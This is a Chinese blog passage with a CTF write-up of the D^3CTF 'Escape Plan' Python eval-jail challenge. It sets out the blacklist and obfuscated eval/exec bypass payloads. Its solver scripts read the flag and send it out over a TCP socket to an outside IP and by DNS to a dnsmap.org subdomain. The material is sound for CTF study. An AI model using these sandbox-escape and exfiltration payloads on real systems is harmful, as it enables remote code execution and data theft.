<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>AntCTFXD^3CTF | anz</title><meta name="author" content="anz"><meta name="copyright" content="anz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="123exp &#x3D; &amp;#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&amp;#x27;print(f&quot;eval(bytes([[j][0]for(i)in[range(&amp;#123;len(exp)&amp;#125;)][0]for(j)in[range(256)][0]if[&quot;+&quot;]]or[&quot;.join([f&amp;">
<meta property="og:type" content="article">
<meta property="og:title" content="AntCTFXD^3CTF">
<meta property="og:url" content="https://aaanz.github.io/web/D3%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="anz">
<meta property="og:description" content="123exp &#x3D; &amp;#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&amp;#x27;print(f&quot;eval(bytes([[j][0]for(i)in[range(&amp;#123;len(exp)&amp;#125;)][0]for(j)in[range(256)][0]if[&quot;+&quot;]]or[&quot;.join([f&amp;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg">
<meta property="article:published_time" content="2023-05-03T08:27:47.715Z">
<meta property="article:modified_time" content="2023-05-16T15:22:11.184Z">
<meta property="article:author" content="anz">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://aaanz.github.io/web/D3%E5%A4%8D%E7%8E%B0/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'AntCTFXD^3CTF',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-05-16 23:22:11'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/75899c342847e73b.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">37</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">15</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://alious-1314078558.cos.ap-beijing.myqcloud.com/CachedImage_1920_1080_POS4.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">anz</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> é¦–é¡µ</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> æ—¶é—´è½´</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> æ ‡ç­¾</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> åˆ†ç±»</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> å‹é“¾</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> å…³äº</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">AntCTFXD^3CTF</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2023-05-03T08:27:47.715Z" title="å‘è¡¨äº 2023-05-03 16:27:47">2023-05-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-05-16T15:22:11.184Z" title="æ›´æ–°äº 2023-05-16 23:22:11">2023-05-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="AntCTFXD^3CTF"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exp = &#x27;__import__(&quot;os&quot;).system(&quot;id&quot;)&#x27;</span><br><span class="line"></span><br><span class="line">print(f&quot;eval(bytes([[j][0]for(i)in[range(&#123;len(exp)&#125;)][0]for(j)in[range(256)][0]if[&quot;+&quot;]]or[&quot;.join([f&quot;i]in[[&#123;i&#125;]]and[j]in[[&#123;ord(j)&#125;&quot; for i, j in enumerate(exp)]) + &quot;]]]))&quot;)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœifè¿‡æ»¤</p>
<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230503212604796.png" alt="image-20230503212604796"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CMD = [eval][eval(list(dict(b_o_o_l=1))[0][::2])(eval(list(dict(e_x_e_c=1))[0][::2])(eval(list(dict(b_y_t_e_s=1))[0][::2])([eval(list(dict(o_r_d=1))[0][::2])(j)for(i)in(list(eval(list(dict(o_p_e_n=1))[0][::2])(eval(list(dict(s_t_r=1))[0][::2])(eval(list(dict(_1_1i1m1p1o1r1t1_1_=1))[0][::2])(list(dict(b_a_s_e_6_4=1))[0][::2]))[23:-2])))[:-5]for(j)in(i)])))](eval(list(dict(b_6_4_d_e_c_o_d_e=1))[0][::2])(list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=1))[0]))</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨ç‚¹å¤„äºå‡½æ•°å†…éƒ¨,execç”Ÿæˆçš„å˜é‡æ— æ³•åœ¨å‡½æ•°ä¸Šä¸‹æ–‡ä¸­ä½¿ç”¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(vars(eval(list(dict(_1_1i1m1p1o1r1t1_1_=1))[0][::2])(list(dict(b_i_n_a_s_c_i_i_=1))[0][::2]))[list(dict(a_2_b1_1b_a_s_e_6_4=1))[0][::2]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=1))[0]))</span><br></pre></td></tr></table></figure>

<p>æ•°å­—ç¦ç”¨</p>
<ul>
<li><code>0</code> -&gt; <code>len([])</code></li>
<li><code>2</code> -&gt; <code>len(list(dict(aa=()))[len([])])</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">u = &#x27;ğŸ¢ğŸ£ğŸ¤ğŸ¥ğŸ¦ğŸ§ğŸ¨ğŸ©ğŸªğŸ«&#x27;</span><br><span class="line"></span><br><span class="line">CMD = &quot;eval(vars(eval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(X19pbXBvcnRfXygnb3MnKS5wb3BlbignZWNobyBIYWNrZWQ6IGBpZGAnKS5yZWFkKCkg=()))[len([])]))&quot;</span><br><span class="line"></span><br><span class="line">CMD = CMD.translate(&#123;ord(str(i)): u[i] for i in range(10)&#125;)</span><br></pre></td></tr></table></figure>



<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg4MjcxMTAwMQ==&mid=2247486967&idx=1&sn=ad55ddd11c6bfa17843270625f5f92fc&chksm=cf53cd41f8244457c2db68626c91f2e4564d756b903222f3a913e89f211d475418864c5041bc&mpshare=1&scene=23&srcid=0501bEUrW8ydbpm175TL5FFn&sharer_sharetime=1682949687637&sharer_shareid=6eea79ff6da57fc6752ab0bc570bf392#rd">2023 D^3CTF writeup by ä¸‡å¹´ä¸‰ç­‰å¥– (qq.com)</a></p>
<h1 id="Escape-Plan"><a href="#Escape-Plan" class="headerlink" title="Escape Plan"></a>Escape Plan</h1><p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge_3</span>():</span><br><span class="line">    cmd = request.form.get(<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cmd:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;&quot;&lt;pre&gt;</span></span><br><span class="line"><span class="string">import requests, base64</span></span><br><span class="line"><span class="string">exp = &#x27;&#x27;</span></span><br><span class="line"><span class="string">requests.post(&quot;&quot;, data=&#123;&quot;cmd&quot;: base64.b64encode(exp.encode())&#125;).text</span></span><br><span class="line"><span class="string">&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cmd = base64.b64decode(cmd).decode()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;bad base64&quot;</span></span><br><span class="line"></span><br><span class="line">    black_char = [</span><br><span class="line">        <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;__&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;import&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> black_char:</span><br><span class="line">        <span class="keyword">if</span> char <span class="keyword">in</span> cmd:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&#x27;failed: `<span class="subst">&#123;char&#125;</span>`&#x27;</span></span><br><span class="line"></span><br><span class="line">    msg = <span class="string">&quot;success&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">eval</span>(cmd)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        msg = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> msg</span><br></pre></td></tr></table></figure>

<h2 id="a2b-base64è§£ç æ‹¼æ¥"><a href="#a2b-base64è§£ç æ‹¼æ¥" class="headerlink" title="a2b_base64è§£ç æ‹¼æ¥"></a>a2b_base64è§£ç æ‹¼æ¥</h2><p>è¿‡æ»¤äº†å¾ˆå¤šâ€¦..</p>
<p>ç‰¹åˆ«æ˜¯<code>.</code>å’Œå¼•å·çš„è¿‡æ»¤é™åˆ¶äº†å¾ˆå¤šæ“ä½œ</p>
<p>åˆ©ç”¨unicodeå­—ç¬¦æ›¿æ¢æ‰e,ç„¶ååˆ©ç”¨ <code>vars(binascii)</code>é‡Œçš„<code>a2b_base64</code>è¿›è¡Œbase64è§£ç ,ç”±äºbase64ç¼–ç åœ¨å‚æ•°ä½ç½®,æˆ‘ä»¬è¿˜æ˜¯ç”¨unicodeæ•°å­—æ¥è¿›è¡Œæ›¿æ¢ç»•è¿‡,ç»•è¿‡ä¹‹åå‘½ä»¤æ‰§è¡Œæ— æ³•ç›´æ¥åå¼¹,é€šè¿‡åˆ›å»ºTCPå¥—æ¥å­—å¸¦å‡º</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket, os</span><br><span class="line">flag = os.popen(<span class="string">&quot;/readflag&quot;</span>).read().encode()</span><br><span class="line">host = <span class="string">&quot;39.105.125.61&quot;</span></span><br><span class="line">port=<span class="number">667</span></span><br><span class="line">s =socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((host, port))</span><br><span class="line">s.sendall(flag)</span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64</span><br><span class="line">u = <span class="string">&#x27;ğŸ¢ğŸ£ğŸ¤ğŸ¥ğŸ¦ğŸ§ğŸ¨ğŸ©ğŸªğŸ«&#x27;</span></span><br><span class="line">payload = <span class="string">b&quot;&quot;&quot;__import__(&#x27;os&#x27;).popen(&quot;python -c &#x27;import socket, os; flag = os.popen(\\&quot;/readflag\\&quot;).read().encode();host = \\&quot;39.105.125.61\\&quot;;port=667;s =socket.socket(socket.AF_INET, socket.SOCK_STREAM);s.connect((host, port));s.sendall(flag);s.close();a=1;&#x27;&quot;).read()&quot;&quot;&quot;</span></span><br><span class="line">payload = <span class="built_in">str</span>(base64.b64encode(payload)).strip(<span class="string">&#x27;b&#x27;</span>).strip(<span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">CMD = <span class="string">&quot;áµ‰val(vars(áµ‰val(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_2_b1_1b_a_s_e_6_4=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(&#123;&#125;=()))[len([])]))&quot;</span>.<span class="built_in">format</span>(payload)<span class="comment">#æ³¨æ„è¿™é‡Œdict(&#123;&#125;())ä¸ç”¨å†™=,å› æ­¤è¦è°ƒè¯•ä¸€ä¸‹payloadå­—ç¬¦ä¸º3çš„å€æ•°ä¿è¯ç¼–ç æ— =</span></span><br><span class="line">CMD = CMD.translate(&#123;<span class="built_in">ord</span>(<span class="built_in">str</span>(i)): u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;)</span><br><span class="line">r = requests.post(<span class="string">&quot;http://139.196.153.118:30187/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:base64.b64encode(CMD.encode())&#125;).text</span><br><span class="line"><span class="built_in">print</span>(CMD)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">X19pbXBvcnRfXygnb3MnKS5wb3BlbigicHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LCBvczsgZmxhZyA9IG9zLnBvcGVuKFwiL3JlYWRmbGFnXCIpLnJlYWQoKS5lbmNvZGUoKTtob3N0ID0gXCIzOS4xMDUuMTI1LjYxXCI7cG9ydD02Njc7cyA9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKGhvc3QsIHBvcnQpKTtzLnNlbmRhbGwoZmxhZyk7cy5jbG9zZSgpO2E9MTsnIikucmVhZCgp=</span><br><span class="line">áµ‰val(<span class="built_in">vars</span>(áµ‰val(<span class="built_in">list</span>(<span class="built_in">dict</span>(_a_aiamapaoarata_a_=()))[<span class="built_in">len</span>([])][::<span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aa=()))[<span class="built_in">len</span>([])])])(<span class="built_in">list</span>(<span class="built_in">dict</span>(b_i_n_a_s_c_i_i_=()))[<span class="built_in">len</span>([])][::<span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aa=()))[<span class="built_in">len</span>([])])]))[<span class="built_in">list</span>(<span class="built_in">dict</span>(a_ğŸ¤_bğŸ£_ğŸ£b_a_s_e_ğŸ¨_ğŸ¦=()))[<span class="built_in">len</span>([])][::<span class="built_in">len</span>(<span class="built_in">list</span>(<span class="built_in">dict</span>(aa=()))[<span class="built_in">len</span>([])])]](<span class="built_in">list</span>(<span class="built_in">dict</span>(XğŸ£ğŸ«pbXBvcnRfXygnbğŸ¥MnKSğŸ§wbğŸ¥BlbigicHlğŸ¢aGğŸ«uICğŸ£jICdpbXBvcnQgcğŸ¤ğŸ«jağŸ¤VğŸ¢LCBvczsgZmxhZyAğŸ«IGğŸ«zLnBvcGVuKFwiLğŸ¥JlYWRmbGFnXCIpLnJlYWQoKSğŸ§lbmNvZGUoKTtobğŸ¥NğŸ¢IDğŸ¢gXCIzOSğŸ¦xMDUuMTIğŸ£LjYxXCIğŸ©cGğŸ«ydDğŸ¢ğŸ¤NjcğŸ©cyAğŸ«cğŸ¤ğŸ«jağŸ¤VğŸ¢LnNvYğŸ¤tldChzbğŸ¤NrZXQuQUZfSUğŸ§FVCwgcğŸ¤ğŸ«jağŸ¤VğŸ¢LlNPQğŸ¢tfUğŸ£RSRUFNKTtzLmNvbmğŸ§lYğŸ¥QoKGhvcğŸ¥QsIHBvcnQpKTtzLnNlbmRhbGwoZmxhZykğŸ©cyğŸ§jbGğŸ«zZSgpOğŸ¤EğŸ«MTsnIikucmVhZCgp=()))[<span class="built_in">len</span>([])]))</span><br><span class="line"></span><br><span class="line">success</span><br><span class="line"></span><br><span class="line">è¿›ç¨‹å·²ç»“æŸ,é€€å‡ºä»£ç <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p><img src="https://alious-1314078558.cos.ap-beijing.myqcloud.com/image-20230503205611271.png" alt="image-20230503205611271"></p>
<h2 id="repråˆ‡ç‰‡æ‹¼æ¥"><a href="#repråˆ‡ç‰‡æ‹¼æ¥" class="headerlink" title="repråˆ‡ç‰‡æ‹¼æ¥"></a>repråˆ‡ç‰‡æ‹¼æ¥</h2><p><a target="_blank" rel="noopener" href="https://fq6p9pyo5tt.feishu.cn/docx/InUFdQUKdozf8yx5IhGcf5zInSe">â€Œï»¿â£â€¬ï»¿â€â¢â¡â£â€¬ï»¿â£â£â€¬â€¬â€¬â£â¤â€¬â¤â€¬ï»¿â€â¡â¢â£ï»¿ï»¿â£â¡â£â¡â¤â¢â¢â€¬â¤â¡â€Œâ¤â¤â€Œâ€¬â¤2023 AntCTF x D^3CTF äºšå†› Writeup By S1uM4i - é£ä¹¦äº‘æ–‡æ¡£ (feishu.cn)</a></p>
<p>è¿‡æ»¤æ•°å­—åˆ©ç”¨<code>len(black_char)</code> å’Œ<code>len([])</code>ç»•è¿‡</p>
<p><code>repr(request)</code>æ‹¿åˆ°å­—ç¬¦ä¸²,å†ä½¿ç”¨æ•°ç»„é…åˆä½è¿ç®—ç¬¦åˆ‡ç‰‡æˆªå–</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">shell=<span class="string">&#x27;ping -c 1 `/readflag`.c17fafb7.dns.dnsmap.org&#x27;</span></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> shell:</span><br><span class="line">    s+=<span class="string">&quot;chr(&quot;</span>+<span class="built_in">str</span>(<span class="built_in">ord</span>(i))+<span class="string">&quot;)+&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">payload = payload = <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(s[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">payload1 = <span class="string">&quot;áµ‰xec(repr(request)[(len(black_char[len([])])&lt;&lt;(len(black_char[len([])])))|(len(black_char[len([])])&lt;&lt;(len(black_char[len([])])&lt;&lt;len(black_char[len([])])))|(len(black_char[len([])])&lt;&lt;(len(black_char[len([])])&lt;&lt;len(black_char[len([])])&lt;&lt;len(black_char[len([])])|len(black_char[len([])]))):len(repr(request))-int(black_char[len(black_char)-len(black_char[len([])])])])&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>: base64.b64encode(payload1.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span><br><span class="line">url=<span class="string">&#x27;http://47.102.115.18:30634/?&#x27;</span>+payload</span><br><span class="line">response=requests.post(url=url,data=data)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<p>åˆ†æä¸€ä¸‹</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#shell=&#x27;ping -c 1 `/readflag`.c17fafb7.dns.dnsmap.org&#x27;</span></span><br><span class="line">shell=<span class="string">&#x27;whoami&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span 